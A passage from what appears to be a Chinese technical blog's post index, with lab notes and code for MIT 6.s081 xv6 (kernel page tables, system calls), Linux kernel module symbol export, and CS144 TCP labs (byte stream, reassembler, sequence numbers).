pagetable;}在scheduler中，切换进程时，需要将改进程的内核页表切换到satp寄存器中并刷新页表缓存，如果没找到合适的进程切换，应当使用全局内核页表代替。在这里有个我想了很久才想明白的问题，为什么在swtch之后调用kvminithart()而不是在没找到可运行进程时再调用，我认为原因是在swtch时，已经从scheduler切换到了选定的进程执行，而swtch返回是因为进程执行结束或者其他情况需要调度器调度，此事应该切换回来，使用init进程本身的内核页表，并且刷新快表缓存：voidscheduler(void){ \t...... // switch h/w page table register to the kernel's page table w_satp(MAKE_SATP(p-&gt;kernel_pagetable)); sfence_vma(); swtch(&amp;c-&gt;context, &amp;p-&gt;context); // Process is done running for now. // It should have changed its p-&gt;state before coming back. \tkvminithart(); c-&gt;proc = 0; found = 1; } release(&amp;p-&gt;lock); }\t......}在释放进程时，需要加入对内核页表和内核栈的处理，只需要释放页表而不需要释放页表映射的最低一级的物理页：static voidfreeproc(struct proc *p){ if(p-&gt;trapframe) kfree((void*)p-&gt;trapframe); p-&gt;trapframe = 0; if(p-&gt;pagetable) proc_freepagetable(p-&gt;pagetable, p-&gt;sz); p-&gt;pagetable = 0; void *kstack_pa = (void *)kvmpa(p-&gt;kernel_pagetable, p-&gt;kstack); kfree(kstack_pa); p-&gt;kstack = 0; // free a page table without also freeing the leaf physical memory pages if (p-&gt;kernel_pagetable) proc_freevmpagetable(p-&gt;kernel_pagetable, p-&gt;sz); p-&gt;kernel_pagetable = 0; p-&gt;sz = 0; p-&gt;pid = 0; p-&gt;parent = 0; p-&gt;name[0] = 0; p-&gt;chan = 0; p-&gt;killed = 0; p-&gt;xstate = 0; p-&gt;state = UNUSED;}void proc_freevmpagetable(pagetable_t pagetable, uint64 sz){ for(int i = 0; i &lt; 512; i++){ pte_t pte = pagetable[i]; uint64 child = PTE2PA(pte); if((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R|PTE_W|PTE_X)) == 0){ // 如果该页表项指向更低一级的页表 // 递归释放低一级页表及其页表项 proc_freevmpagetable((pagetable_t)child, sz); pagetable[i] = 0; } } kfree((void*)pagetable);}在进行了上述修改后，运行make qemu，会出现panic：virtio status，究其原因，是因为在virtio_disk_rw中，原本的获得buf0的虚拟地址采用的是kvmpa函数，而kvmpa通过对全局的内核页表进行查询以获得va对应的物理地址，在为每个进程分配一个内核页表后，应该对kvmpa作出修改，以使其查找自己的内核页表以获得物理地址，修改后可成功运行：voidvirtio_disk_rw(struct buf *b, int write){ ...... buf0.reserved = 0; buf0.sector = sector; // buf0 is on a kernel stack, which is not direct mapped, // thus the call to kvmpa(). pagetable_t pagetbl = myproc()-&gt;kernel_pagetable; disk.desc[idx[0]].addr = (uint64) kvmpa(pagetbl, (uint64) &amp;buf0); disk.desc[idx[0]].len = sizeof(buf0); disk.desc[idx[0]].flags = VRING_DESC_F_NEXT; disk.desc[idx[0]].next = idx[1]; ......}对应的kvmpa：uint64kvmpa(pagetable_t pagetable, uint64 va){ uint64 off = va % PGSIZE; pte_t *pte; uint64 pa; pte = walk(pagetable, va, 0); if(pte == 0) panic(\"kvmpa\"); if((*pte &amp; PTE_V) == 0) panic(\"kvmpa\"); pa = PTE2PA(*pte); return pa+off;}Simplify copyin/copyinstr内核的copyin函数通过遍历进程的用户页表将用户提供的指针翻译成内核可以直接解引用的物理地址，而这部分的任务是在每个进程的内核页表中添加到用户内存的映射，从而能够使内核直接解引用用户提供的虚拟地址而不需要再去遍历用户页表，从而可以利用CPU的硬件寻址功能进行寻址，并且可以使用快表加速。这一机制依赖于用户空间的虚拟地址不会与内核的虚拟地址空间发生重叠，在xv6中，内核虚拟地址空间在0xC000000以上，这个值保存在PLIC寄存器中，而用户地址空间从0开始，因此需要限制用户空间的增长不要超过PLIC。为了实现以上目的，需要在每处内核对用户页表进行修改时，将同样的修改同步到内核页表中，使得两个页表的程序段地址空间的映射同步。首先实现将用户页表的指定地址空间拷贝到内核页表中：int kvmcopy_pagetbl(pagetable_t src, pagetable_t dst, uint64 start, uint64 sz) {\tpte_t *pte;\tuint64 pa, i;\tuint64 flags;\t\tfor (i = PGROUNDUP(start); i &lt; start + sz; i += PGSIZE){\t\tif ((pte = walk(src, i, 0)) == 0)\t\t\tpanic(\"kvmcopy_pagetbl: walk\");\t\tif ((*pte &amp; PTE_V) == 0) panic(\"kvmcopy_pagetbl: invalid page\"); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte) &amp; ~PTE_U; if (mappages(dst, i, PGSIZE, pa, flags) != 0) { goto err; }\t} return 0;err: uvmunmap(dst, PGROUNDUP(start), (i - PGROUNDUP(start)) / PGSIZE, 0); return -1;}对应地，添加解除映射的函数：uint64 kvmdealloc(pagetable_t pagetable, uint64 oldsz, uint64 newsz) {\tif (newsz &gt;= oldsz)\t\treturn oldsz;\t\tif (PGROUNDUP(newsz) &lt; PGROUNDUP(oldsz)) {\t\tint npages = (PGROUNDUP(oldsz) - PGROUNDUP(newsz)) / PGSIZE;\t\tuvmunmap(pagetable, PGROUNDUP(newsz), npages, 0);\t}\t\treturn newsz;}在exec中加入代码防止用户内存超出PLIC的限制：intexec(char *path, char **argv){\t//...... for(i=0, off=elf.phoff; i&lt;elf.phnum; i++, off+=sizeof(ph)){ \t//..... if((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == 0) goto bad; if (sz1 &gt;= PLIC) goto bad; sz = sz1; //...... } //......}在fork中将用户内存从父进程拷贝到子进程中之后，将子进程用户页表的起始地址映射到内核页表中：int fork(void) {\t// ...... if (kvmcopy_pagetbl(np-&gt;pagetable, np-&gt;kernel_pagetable, 0, p-&gt;sz) != 0){ freeproc(np); release(&amp;np-&gt;lock); return -1; } // ......}在exec中，由于需要使用新的程序映像替换，因此需要首先清除内核页表中对于旧的用户地址空间的映射，然后加入新的内存映射：intexec(char *path, char **argv){ //...... // Save program name for debugging. for(last=s=path; *s; s++) if(*s == '/') last = s+1; safestrcpy(p-&gt;name, last, sizeof(p-&gt;name)); uvmunmap(p-&gt;kernel_pagetable, 0, PGROUNDUP(oldsz) / PGSIZE, 0); if (kvmcopy_pagetbl(pagetable, p-&gt;kernel_pagetable, 0, sz) != 0) goto bad; // Commit to the user image. oldpagetable = p-&gt;pagetable; p-&gt;pagetable = pagetable; p-&gt;sz = sz; p-&gt;trapframe-&gt;epc = elf.entry; // initial program counter = main p-&gt;trapframe-&gt;sp = sp; // initial stack pointer proc_freepagetable(oldpagetable, oldsz); //......}growproc中，首先需要加入对于映射的用户空间大小的限制，然后在proc的用户空间增长和缩小时同步缩小对应的映射：int growproc(int n){ uint sz; struct proc *p = myproc(); sz = p-&gt;sz; if(n &gt; 0){ uint64 newsz; if((newsz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == 0) { return -1; } // 内核页表中的映射同步扩大 if(kvmcopy_pagetbl(p-&gt;pagetable, p-&gt;kernel_pagetable, sz, n) != 0) { uvmdealloc(p-&gt;pagetable, newsz, sz); return -1; } sz = newsz; } else if(n &lt; 0){ uvmdealloc(p-&gt;pagetable, sz, sz + n); // 内核页表中的映射同步缩小 sz = kvmdealloc(p-&gt;kernel_pagetable, sz, sz + n); } p-&gt;sz = sz; return 0;}对于init进程，由于不是由fork创建的，因此在userinit中同样需要加入映射代码：voiduserinit(void){ // ...... // allocate one user page and copy init's instructions // and data into it. uvminit(p-&gt;pagetable, initcode, sizeof(initcode)); p-&gt;sz = PGSIZE; kvmcopy_pagetbl(p-&gt;pagetable, p-&gt;kernel_pagetable, 0, p-&gt;sz); // ......}将copyin和copyinstr函数注释掉，改为直接调用copyinnew和copyinstr_new两个函数，make qemu运行usertests，成功通过。== Test count copyin == $ make qemu-gdbcount copyin: OK (1.2s) == Test usertests == $ make qemu-gdb(194.3s) == Test usertests: copyin == usertests: copyin: OK == Test usertests: copyinstr1 == usertests: copyinstr1: OK == Test usertests: copyinstr2 == usertests: copyinstr2: OK == Test usertests: copyinstr3 == usertests: copyinstr3: OK == Test usertests: sbrkmuch == usertests: sbrkmuch: OK == Test usertests: all tests == usertests: all tests: OK == Test time == time: OK " }, { "title": "MIT 6.s081 Lab system calls", "url": "/_posts/MIT-6.s081-Lab-system-calls/", "categories": "operating system, xv6", "tags": "operating system, xv6", "date": "2023-03-06 00:00:00 +0000", "snippet": " Lab: System calls (mit.edu)System call tracing实现系统调用trace，输入参数为一个int类型的mask，其中mask的某一位为1代表与该位对应的系统调用应该被trace。例如trace(1« SYS_fork)表示trace fork这一系统调用。被trace的系统调用输出：pid: syscall syscall_name -&gt; r...", "content": " Lab: System calls (mit.edu)System call tracing实现系统调用trace，输入参数为一个int类型的mask，其中mask的某一位为1代表与该位对应的系统调用应该被trace。例如trace(1« SYS_fork)表示trace fork这一系统调用。被trace的系统调用输出：pid: syscall syscall_name -&gt; return value。首先在user/user.h中包含了当前系统中所有系统调用的声明，因此应该在该文件中添加trace的声明。user/目录下已经包含了trace.c这一命令的源文件，其中对于trace的调用为：if (trace(atoi(argv[1])) &lt; 0) {    fprintf(2, \"%s: trace failed\\n\", argv[0]);    exit(1);}可以看出trace的返回值为int类型，在trace执行错误时返回负数，否则返回非负数。因此在user.h中添加该系统调用的声明：int trace(int);在用户态调用该函数时，通过执行user/usys.S中与系统调用对应的命令从用户态切换到内核态以执行真正的系统调用处理函数：trace: li a7, SYS_trace ecall ret其中第一行li a7, SYS_trace是设置系统调用号，第二行ecall陷入内核态，执行uservec、usertrap和syscall，第三行ret在系统调用执行完毕返回用户态后返回。SYS_trace是在kernel/syscall.h中定义的系统调用号：#define SYS_trace 22syscall函数定义在kernel/syscall.c中，通过myproc函数获得当前运行进程的proc结构体，通过读取a7寄存器获得需要执行的系统调用号，如果该系统调用号合法，则通过系统调用号获取对应的函数指针并执行，系统调用的返回值保存在a0寄存器中。我们在proc结构体中添加了trace_mask用于记录trace的mask参数，如果trace_mask &amp; 1 « num不为0，则表示该系统调用应当被trace，输出对应的记录信息：void syscall(void){  int num;  struct proc *p = myproc();  num = p-&gt;trapframe-&gt;a7;  if (num &gt; 0 &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])  {    p-&gt;trapframe-&gt;a0 = syscalls[num]();    if ((p-&gt;trace_mask &amp; (1 &lt;&lt; num)) != 0)    {      printf(\"%d: syscall %s -&gt; %d\\n\", p-&gt;pid, mapping(num), p-&gt;trapframe-&gt;a0);    }  }  else  {    printf(\"%d %s: unknown sys call %d\\n\", p-&gt;pid, p-&gt;name, num);    p-&gt;trapframe-&gt;a0 = -1;  }}每个系统调用函数定义在kernel/sysproc.c中，仿照其他的系统调用，参数通过argint来获得，形参设置为void：uint64sys_trace(void) {  struct proc *p = myproc();  if (argint(0, &amp;p-&gt;trace_mask) &lt; 0) {    return -1;  }  return 0;}在执行完trace这一系统调用后，trace.c随后调用了exec，相当于创建一个新的进程来执行被trace的后续命令，因此需要修改fork来传递trace进程的trace_mask值：// user/trace.cexec(nargv[0], nargv);// kernel/proc.cintfork(void){\t...\tnp-&gt;state = RUNNABLE;\tnp-&gt;trace_mask = p-&gt;trace_mask;\trelease(&amp;np-&gt;lock);\t...}最后执行trace的输出如下：Sysinfo实现系统调用sysinfo，收集来自运行时的系统信息。该系统调用以一个指向struct sysinfo类型的指针作为参数，返回系统剩余的内存大小和当前的进程数。与上面的trace类似，首先添加用户态的系统调用声明：int sysinfo(struct sysinfo *);随后在kernel/syscall.h添加SYS_sysinfo对应的系统调用号：#define SYS_sysinfo 23在kernel/sysproc.c中添加sysinfo系统调用处理函数的定义：uint64sys_sysinfo(void) {  uint64 st;  struct sysinfo info;  if (argaddr(0, &amp;st) &lt; 0)    return -1;  info.nproc = proccount();  info.freemem = freemem();  struct proc *p = myproc();  if (copyout(p-&gt;pagetable, st, (char *)&amp;info, sizeof(info)))    return -1;  return 0;}其中通过argaddr获取传入的sysinfo指针指向的地址，通过proccount和freemem两个函数设置info的nproc和freemem两个字段，然后通过copyout将info拷贝到传入参数所指向的sysinfo中。copyout的定义为：int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len);作用是从src拷贝len个字节到进程虚拟地址dstva中，而dstva通过进程页表pagetable转换到对应的物理地址。proccount在kernel/proc.c中定义proccount函数来返回系统中的进程数：uint64 proccount(void) { uint64 cnt = 0; struct proc *p; for (p = proc; p &lt; &amp;proc[NPROC]; p++) { if (p-&gt;state == UNUSED) continue; cnt++; } return cnt;}xv6内核中所有的进程组织为struct proc类型的数组，数组长度固定为64，在通过allocproc来创建新的进程时遍历proc数组找到第一个状态为UNUSED的进程初始化为新进程。因此在计数系统中非空闲的进程时，只需要遍历整个proc数组，依次判断类型是否为UNUSED，如果不是UNUSED则计数+1。freemem在kernel/kalloc.c中添加freemem函数来计算当前的剩余空间：uint64freemem(void) { struct run *r; uint64 cnt = 0; acquire(&amp;kmem.lock); r = kmem.freelist; while (r) { cnt += PGSIZE; r = r-&gt;next; } release(&amp;kmem.lock); return cnt;}xv6空闲内存以链表的形式组织，定义为kmem：struct run { struct run *next;};struct { struct spinlock lock; struct run *freelist;} kmem;kmem的第一个字段为自旋锁，保证在一个时间点只有一个进程访问kmem。第二个字段为freelist，即当前空余的页组成的链表。在kalloc函数中分配内存时，首先通过acquire获取锁，然后从freelist中获得一个空闲的节点，然后释放锁，再通过memset初始化分配的页：void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) kmem.freelist = r-&gt;next; release(&amp;kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r;}memset的第三个参数为PGSIZE，也就是说每个空闲节点对应的内存大小为PGSIZE个字节，因此在freemem中遇到的每个freelist使计数+PGSIZE。最后通过测试:" }, { "title": "Linux内核与模块数据交互方式总结", "url": "/_posts/Linux-%E5%86%85%E6%A0%B8%E4%B8%8E%E6%A8%A1%E5%9D%97%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/", "categories": "operating system, Linux", "tags": "operating system, Linux", "date": "2023-03-03 00:00:00 +0000", "snippet": "1. 通过Linux内核与模块之间的接口定义静态全局变量，通过Linux内核与模块之间的接口，将全局变量的地址传递给kernel以ixgbe驱动为例：模块中定义了static全局变量 ixgbe_driver:static struct pci_driver ixgbe_driver = {\t.name = ixgbe_driver_name,\t.id_table = ixgbe_p...", "content": "1. 通过Linux内核与模块之间的接口定义静态全局变量，通过Linux内核与模块之间的接口，将全局变量的地址传递给kernel以ixgbe驱动为例：模块中定义了static全局变量 ixgbe_driver:static struct pci_driver ixgbe_driver = {\t.name = ixgbe_driver_name,\t.id_table = ixgbe_pci_tbl,\t.probe = ixgbe_probe,\t.remove = __devexit_p(ixgbe_remove),#ifdef CONFIG_PM#ifndef USE_LEGACY_PM_SUPPORT\t.driver = {\t\t.pm = &amp;ixgbe_pm_ops,\t},#else\t.suspend = ixgbe_suspend,\t.resume = ixgbe_resume,#endif /* USE_LEGACY_PM_SUPPORT */#endif#ifndef USE_REBOOT_NOTIFIER\t.shutdown = ixgbe_shutdown,#endif#ifdef HAVE_SRIOV_CONFIGURE\t.sriov_configure = ixgbe_pci_sriov_configure,#endif#ifdef HAVE_PCI_ERS\t.err_handler = &amp;ixgbe_err_handler#endif};在module_init中，通过pci_register_driver向PCI subsystem注册该驱动，将上述全局变量的地址传给subsystem。pci_register_driver实际上是一个宏，调用的真正函数为__pci_register_driver:#define pci_register_driver(driver)\t\t\t__pci_register_driver(driver, THIS_MODULE, KBUILD_MODNAME)在该函数中，初始化driver的一系列字段，并向总线注册device_driver：int __pci_register_driver(struct pci_driver *drv, struct module *owner,\t\t\t const char *mod_name){\t/* initialize common driver fields */\tdrv-&gt;driver.name = drv-&gt;name;\tdrv-&gt;driver.bus = &amp;pci_bus_type;\tdrv-&gt;driver.owner = owner;\tdrv-&gt;driver.mod_name = mod_name;\tdrv-&gt;driver.groups = drv-&gt;groups;\tdrv-&gt;driver.dev_groups = drv-&gt;dev_groups;\tspin_lock_init(&amp;drv-&gt;dynids.lock);\tINIT_LIST_HEAD(&amp;drv-&gt;dynids.list);\t/* register with core */\treturn driver_register(&amp;drv-&gt;driver);}EXPORT_SYMBOL(__pci_register_driver);2.向kernel传递一个函数指针，通过函数指针来修改模块内部的数据在上述ixgbe_driver的定义中，将probe字段设置为ixgbe_probe函数，其定义如下：static int __devinit ixgbe_probe(struct pci_dev *pdev,\t\t\t\t const struct pci_device_id __always_unused *ent)3. EXPORT_SYMBOL/EXPORT_SYMBOL_GPT导出全局变量二者的区别在于后者仅支持MODULE_LICENSE为GPT的模块默认情况下，模块与模块之间、模块与内核之间的全局变量是相互独立的，只有通过EXPORT_SYMBOL将模块导出才能对其他模块或内核可见。首先介绍一下Linux kallsyms：内核符号表，其中会列出所有的Linux内核中的导出符号，在用户态下可以通过/proc/kallsyms访问，此时由于内核保护，看到的地址为0x0000000000000000，在root模式下可以看到真实地址。启用kallsyms需要编译内核时设置CONFIG_KALLSYMS为y。Linux模块在编译时符号的查找顺序： 在本模块中符号表中，寻找符号(函数或变量实现) 在内核全局符号表中寻找 在模块目录下的Module.symvers文件中寻找 下面我们编写两个模块对EXPORT_SYMBOL的作用加以说明。在通过内核模块定义一个名为_exported_symbol的全局变量前，首先查看kallsyms，此时并不存在这一符号：创建一个新的内核模块，并定义：//mod.c#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;int _exported_symbol = 0;// EXPORT_SYMBOL(_exported_symbol);...编译并插入该模块，查看内核符号表，发现出现了地址在0xffffffffc09c0380，类型为b的名为_exported_symbol的符号：而编译产生的Module.symvers为空。在另一模块中通过extern链接此符号，并将上述Module.symvers拷贝到该目录下：#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;extern int _exported_symbol;...编译报错，该模块无法访问_exported_symbol这一符号：当在第一个模块中加入EXPORT_SYMBOL(_exported_symbol)这一语句，编译并重新插入后，再次查看kallsyms，发现其类型变为B：其编译产生的Module.symvers为：此时再次编译模块2，成功编译。在不插入模块1的情况下插入模块2，会出现Unknown symbol in module，原因在于此时内核全局符号表中不存在该符号：先插入模块1，再插入模块2，通过dmesg查看_exported_symbol的变化，此时模块1中定义的exported_symbol成功被模块2使用并修改：将mod1中的EXPORT_SYMBOL注释掉，插入模块1，此时全局符号表中的符号类型为b，插入模块2报错，无法访问模块1中的符号：原因在于，模块类型为小写字母b表示局部引用，定义在BSS，只能在模块内访问。模块类型为大写字母B表示全局引用，可以在模块外访问，其他类型类似。Reference1.intersvyaz/ixgbe: ixgbe driver mirror (github.com)2.Inter-module communication in Linux kernel - Stack Overflow3.c - How to call exported kernel module functions from another module? - Stack Overflow" }, { "title": "CS144 Lab Assignments 学习笔记", "url": "/_posts/CS144-notes/", "categories": "计算机网络", "tags": "计算机网络", "date": "2023-02-05 00:00:00 +0000", "snippet": " CS 144: Introduction to Computer NetworkingLab 0Writing webget要求使用TCPSocket和Address类实现get_URL函数。get_URL的功能是向指定的host和path发送GET请求，以抓取页面。可以参考Sponge: TCPSocket Class Reference (cs144.github.io)中的示例来了...", "content": " CS 144: Introduction to Computer NetworkingLab 0Writing webget要求使用TCPSocket和Address类实现get_URL函数。get_URL的功能是向指定的host和path发送GET请求，以抓取页面。可以参考Sponge: TCPSocket Class Reference (cs144.github.io)中的示例来了解类和方法的使用。HTTP 请求报文中需要的头部字段和值分别为： Connection：Close，用于通知host不必等待client后续发送请求，在接收到该请求后发送响应。 Host: host表示被请求的主机URL 在请求头和请求数据之间存在一个空行，而GET请求没有请求数据，因此以空行结尾。void get_URL(const string &amp;host, const string &amp;path) { TCPSocket sock; sock.connect(Address(host, \"http\")); sock.write(\"GET \" + path + \" HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nConnection: close\\r\\n\\r\\n\"); sock.shutdown(SHUT_WR);\t\t//发送完毕，关闭读写 while (!sock.eof()) { cout &lt;&lt; sock.read(); } sock.close();}An in-memory reliable byte stream要求实现可靠的字节流的抽象，在输入端写入字节而在输出端按照相同顺序读出字节。实质上相当于一个带有容量限制的队列，发送方从末尾写，接收方从头部读出，已经被读出的字节从队列中删除，以释放内存空间。ByteStream定义如下：class ByteStream { private: std::string byte_stream = \"\"; size_t _capacity = 0; size_t bytes_written_count = 0; size_t bytes_read_count = 0; bool _error{}; //!&lt; Flag indicating that the stream suffered an error. bool input_end = false;初始时byte_stream定义为空字符串，_capacity表示ByteStream容量，bytes_written_count和bytes_read_count分别表示已经向ByteStream中写入和读出的字符数，均定义为size_t类型，初始化为0。input_end为true表示输入已经结束，初始为false。byte_stream.cc中成员函数定义如下：ByteStream::ByteStream(const size_t capacity) { _capacity = capacity;}// capacity - byte_stream.size() = remaining_capacitysize_t ByteStream::write(const string &amp;data) { size_t written = 0; if (data.size() &lt;= remaining_capacity()) { written = data.size(); byte_stream += data; } else { written = remaining_capacity(); byte_stream += data.substr(0, written); } bytes_written_count += written; return written;}//! \\param[in] len bytes will be copied from the output side of the bufferstring ByteStream::peek_output(const size_t len) const { string res; if (byte_stream.size() &lt;= len) { res = byte_stream; } else { res = byte_stream.substr(0, len); } return res;}//! \\param[in] len bytes will be removed from the output side of the buffervoid ByteStream::pop_output(const size_t len) { if (byte_stream.size() &lt;= len) { bytes_read_count += byte_stream.size(); byte_stream = \"\"; } else { bytes_read_count += len; byte_stream = byte_stream.substr(len, byte_stream.size() - len); }}//! Read (i.e., copy and then pop) the next \"len\" bytes of the stream//! \\param[in] len bytes will be popped and returned//! \\returns a stringstd::string ByteStream::read(const size_t len) { std::string res = peek_output(len); pop_output(len); return res;}void ByteStream::end_input() { input_end = true; }bool ByteStream::input_ended() const { return input_end; }size_t ByteStream::buffer_size() const { return byte_stream.size(); }bool ByteStream::buffer_empty() const { return byte_stream.empty(); }bool ByteStream::eof() const { return buffer_empty() &amp;&amp; input_ended(); }size_t ByteStream::bytes_written() const { return bytes_written_count; }size_t ByteStream::bytes_read() const { return bytes_read_count; }size_t ByteStream::remaining_capacity() const { return _capacity - byte_stream.size(); }其中buffer_size和buffer_empty分别表示缓冲区的大小和缓冲区是否为空，buffer即ByteStream类中的byte_stream字符串。读操作分为了两个步骤：先peek后pop，根据测试用例，在peek时应该随之更新bytes_read_count，而不能在完成一个完整的read操作后再更新。在向byte_stream中写入字节时，应该判断是否超出了缓冲区的容量，超出容量的部分直接截断，而无需缓存。如何判断是否读到了eof？参照EOF的定义，When the reader has read to the end of the stream, it will reach “EOF” (end of file)。只有当输入方已经不再输入（即input_ended == true）并且缓冲区中的数据已经全部读出（即buffer_empty==true）时，输出端读到了字节流的末尾。Lab 1要求将乱序的子串重排序，合并成连续的顺序正确的ByteStream。ByteStream中的每个字节都有唯一的下标，下标规定了字节的先后顺序。字节实际上分成了两部分：ByteStream中已经排好序的连续子串和unassembled_bytes中尚未排好序 的子串。对于一个起始下标为index的子串，只有当index-1对应的字节已经写入到ByteStream中后，才能够将index对应的子串加入到ByteStream中。因此应该选择有序的数据结构，考虑到重复下标对应的字节仅应保存一次，在合并不同的子串时需要遍历整个数据结构，因此采用set作为unassembled_bytes。StreamReassembler类定义如下：struct block { std::string data; size_t index; bool eof; block(std::string &amp;s, bool flag, size_t idx) : data(s), index(idx), eof(flag) {} bool operator&lt;(const block &amp;b) const { return index &lt; b.index; }};class StreamReassembler { private: std::set&lt;block&gt; unorder_bytes = std::set&lt;block&gt;(); ByteStream _output; //!&lt; The reassembled in-order byte stream size_t _capacity; //!&lt; The maximum number of bytes // _capacity = _output.size() + unassembled size size_t next_index = 0; size_t unassembled_count = 0; bool _eof = false; void merge_block(const block &amp;b); ......push_substring的处理流程：首先判断待插入的子串是否已经写入过ByteStream或是超出capacity的限制，如果存在与ByteStream重叠或超出限制的部分，则对子串进行截取。如果子串刚好可以写入ByteStream，则调用write方法，并递归检查unassembled_bytes中是否有可以加入到ByteStream中的block。如果子串与ByteStream不连续，则将子串与unassembled_bytes中的block进行合并，等待后续的插入。如果eof为true，并且参数中的data没有超出容量限制，表示已经读取到了文件末尾，将_eof标志设置为true。如果_eof为true并且不存在乱序的子串，则调用end_input()方法表示输入结束。如果eof为true但data超出容量限制从而丢弃了data中靠后的部分，此时EOF并未加入到unassembled_bytes或ByteStream中，_eof保持不变以等待重传。push_substring代码如下：void StreamReassembler::push_substring(const string &amp;data, const size_t index, const bool eof) { size_t right = index + data.size(); size_t bound = next_index + _capacity - _output.buffer_size(); if (right &lt;= next_index) { if (eof) _eof = true; if (_eof &amp;&amp; empty()) _output.end_input(); return; } if (index &gt;= bound) return; bool end = eof; std::string substring = std::move(data); if (right &gt; bound) { substring = substring.substr(0, substring.size() - (right - bound)); end = false; } if (index &lt;= next_index) { substring = substring.substr(next_index - index, substring.size() - (next_index - index)); next_index += substring.size(); _output.write(substring); if (end) _eof = true; while (!unorder_bytes.empty()) { auto iter = unorder_bytes.begin(); if ((*iter).index &lt;= next_index) { auto str = (*iter).data; bool flag = (*iter).eof; size_t idx = (*iter).index; unorder_bytes.erase(*iter); unassembled_count -= str.size(); push_substring(str, idx, flag); continue; } break; } } else { merge_block(block(substring, end, index)); } if (_eof &amp;&amp; empty()) _output.end_input();}void StreamReassembler::merge_block(const block &amp;b) { for (auto iter = unorder_bytes.begin(); iter != unorder_bytes.end(); iter++) { if (b.index + b.data.size() &lt; (*iter).index) { unorder_bytes.insert(b); unassembled_count += b.data.size(); return; } else if (b.index &lt; (*iter).index &amp;&amp; b.index + b.data.size() &gt;= (*iter).index &amp;&amp; b.index + b.data.size() &lt; (*iter).index + (*iter).data.size()) { size_t index = b.index; std::string str = b.data.substr(0, (*iter).index - b.index) + (*iter).data; bool eof = (*iter).eof || b.eof; unassembled_count -= (*iter).data.size(); unassembled_count += str.size(); unorder_bytes.erase(*iter); unorder_bytes.insert(block(str, eof, index)); return; } else if (b.index &gt;= (*iter).index &amp;&amp; b.index + b.data.size() &lt;= (*iter).index + (*iter).data.size()) { return; } else if (b.index &lt;= (*iter).index &amp;&amp; b.index + b.data.size() &gt;= (*iter).index + (*iter).data.size()) { unassembled_count -= (*iter).data.size(); unorder_bytes.erase(*iter); merge_block(b); return; } else if (b.index &gt;= (*iter).index &amp;&amp; b.index &lt;= (*iter).index + (*iter).data.size() &amp;&amp; b.index + b.data.size() &gt; (*iter).index + (*iter).data.size()) { size_t index = (*iter).index; std::string str = (*iter).data.substr(0, b.index - (*iter).index) + b.data; bool eof = (*iter).eof || b.eof; unassembled_count -= (*iter).data.size(); unorder_bytes.erase(*iter); merge_block(block(str, eof, index)); return; } } unorder_bytes.insert(b); unassembled_count += b.data.size();}Lab 2实现64bit的下标和32bit序列号之间的转换主要是实现两个方法：//! Transform a 64-bit absolute sequence number (zero-indexed) into a 32-bit relative sequence numberWrappingInt32 wrap(uint64_t n, WrappingInt32 isn);//! Transform a 32-bit relative sequence number into a 64-bit absolute sequence number (zero-indexed)uint64_t unwrap(WrappingInt32 n, WrappingInt32 isn, uint64_t checkpoint);从64位转换为32位比较简单，直接截取低32位即可。从32位转换为64位比较复杂，因为一个32位的序列号可能会对应无数个64位的下标，因此需要使用checkpoint作为锚定点，选择与数轴上checkpoint距离最近的作为下标。参数中的isn是产生的初始序列号，n是需要转换到64位的序列号。其中$ n = (isn + index) \\&amp; 0xFFFFFFFF $显然，index的低32位与 $n - isn + (1ll « 32)$的低32位相同。设$ tmp = n - isn + (1ll « 32) \\&amp;0xFFFFFFFF $。那么问题就转变成了，寻找与checkpoint在数轴上距离最近的index，使得$ (index - tmp) \\% (1ll « 32) = 0$。令$tmp = tmp + 1ll«32, if tmp &lt; checkpoint $,则$index = min(tmp, tmp - 1ll « 32)$.wrap和unwrap代码如下：//! Transform an \"absolute\" 64-bit sequence number (zero-indexed) into a WrappingInt32//! \\param n The input absolute 64-bit sequence number//! \\param isn The initial sequence numberWrappingInt32 wrap(uint64_t n, WrappingInt32 isn) { return WrappingInt32(n + isn.raw_value());}//! Transform a WrappingInt32 into an \"absolute\" 64-bit sequence number (zero-indexed)//! \\param n The relative sequence number//! \\param isn The initial sequence number//! \\param checkpoint A recent absolute 64-bit sequence number//! \\returns the 64-bit sequence number that wraps to `n` and is closest to `checkpoint`//!//! \\note Each of the two streams of the TCP connection has its own ISN. One stream//! runs from the local TCPSender to the remote TCPReceiver and has one ISN,//! and the other stream runs from the remote TCPSender to the local TCPReceiver and//! has a different ISN.uint64_t unwrap(WrappingInt32 n, WrappingInt32 isn, uint64_t checkpoint) { uint64_t tmp = 0; uint64_t tmp1 = 0; if (n - isn &lt; 0) { tmp = uint64_t(n - isn + (1l &lt;&lt; 32)); } else { tmp = uint64_t(n - isn); } if (tmp &gt;= checkpoint) return tmp; tmp |= ((checkpoint &gt;&gt; 32) &lt;&lt; 32); while (tmp &lt;= checkpoint) tmp += (1ll &lt;&lt; 32); tmp1 = tmp - (1ll &lt;&lt; 32); return (checkpoint - tmp1 &lt; tmp - checkpoint) ? tmp1 : tmp;}实现TCP receiverreceiver的功能主要有三个部分：1）接收对端发送的segment；2）使用StreamResassembler重排成ByteStream；3）计算ackno和窗口大小。TCPReceiver类定义如下：class TCPReceiver { //! Our data structure for re-assembling bytes. StreamReassembler _reassembler; //! The maximum number of bytes we'll store. size_t _capacity = 0; WrappingInt32 isn = WrappingInt32(0); // _ackno = absolute sequence number + 1 // ackno = wrap(_ackno + isn) uint64_t _ackno = 0; bool _syn = false; bool _fin = false;\t...}receiver每次接收到新的segment时，调用segment_received方法，如果此时: 连接尚未建立 如果SYN置位，表明收到了第一次握手，初始化ISN和_ackno 否则，表明收到了过期的segment，直接丢弃 连接已经建立 如果syn置位，表明收到了冗余的握手报文，直接丢弃 